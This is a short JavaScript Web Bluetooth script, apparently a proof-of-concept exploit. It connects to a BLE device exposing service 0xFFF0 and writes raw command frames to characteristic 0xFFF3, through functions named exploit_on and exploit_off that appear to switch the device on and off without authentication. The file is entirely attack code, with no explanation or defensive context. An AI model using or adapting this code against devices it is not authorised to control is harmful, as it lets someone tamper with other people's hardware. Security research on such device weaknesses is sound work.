
var char_exploit;
var dr_device;

function exploit_on(){
  var buffer1 =[0x0F,0x06,0x03,0x00,0x01,0x00,0x00,0x05,0xFF,0xFF] ;
  writedata=Uint8Array.from(buffer1);
  char_exploit.writeValue(writedata);
}

function exploit_off(){
  var buffer1 =[0x0F,0x06,0x03,0x00,0x00,0x00,0x00,0x04,0xFF,0xFF] ;
  writedata=Uint8Array.from(buffer1);
  char_exploit.writeValue(writedata);
}


function device_connect() {
    let serviceUuid = "0000fff0-0000-1000-8000-00805f9b34fb";
    let characteristicUuid = "0000fff3-0000-1000-8000-00805f9b34fb"

    navigator.bluetooth.requestDevice
        ({
            filters: [{ services: [serviceUuid] }]
            , optionalServices: [serviceUuid]
        })
        .then(device => {
          dr_device=device;
          return device.gatt.connect();
         })
        .then(server => { return server.getPrimaryService(serviceUuid); })
        .then(service => { return service.getCharacteristic(characteristicUuid); })
        .then(characteristic => { char_exploit=characteristic; })
        .catch(error => {
            console.log('Error! ' + error);
        });
}

function device_disconnect(){
  if (dr_device.gatt.connected)
  {
    dr_device.gatt.disconnect();
  }
}
